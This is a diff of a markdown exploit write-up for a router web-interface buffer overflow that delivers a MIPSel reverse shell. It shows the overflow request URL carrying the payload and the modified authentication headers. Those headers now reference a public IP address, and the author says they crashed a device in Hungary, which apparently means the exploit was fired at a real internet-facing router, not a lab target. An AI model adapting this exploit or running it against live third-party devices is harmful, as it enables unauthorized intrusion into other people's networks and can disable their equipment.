@@ -102,7 +102,38 @@ to
 bof_url = base_url+"/"+session_id+"/userRpm/NasFolderSharingRpm.htm?displayName=bof&mediaShare=on&shareFolderName="+payload+"&Save=Save&selPage=0&Page=1&subpage=2&no_use_para_just_fix_ie_sub_bug="
 ```
 
-And obviously the target address and the reverse shell address in the Mipsel Reverse Shell then the exploit worked without  problem as can be seen below:
+Also, I had to change the HTTP Headers to achievee a correct authentication with the device from:
+
+```
+headers = { 
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", 
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
+            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", 
+            "Referer": "http://192.168.0.1/", 
+            "Cookie": "Authorization="+cookie_auth_string, 
+            "Authorization": "Basic "+basic_string, 
+            "Connection": "close", 
+            "Upgrade-Insecure-Requests": "1"
+          }
+    
+to
+
+
+headers = {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+            "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
+            "Referer": "http://178.164.131.28:100/",
+            "Accept-Encoding": "gzip, deflate",
+            "Cookie": "Authorization="+cookie_auth_string,
+            "Connection": "close",
+            "Upgrade-Insecure-Requests": "1"
+          }
+
+```
+
+
+And obviously the target address into the the Mipsel Reverse Shell source code. With these little modifications the exploit worked without problem as can be seen below:
 
 **TODO: CREATE AND ADD EXPLOIT and add Images/Videos of exploitation and reaching internal network**
 **I Already have the Crash PoC... I crashed the Hungary device FUCK**
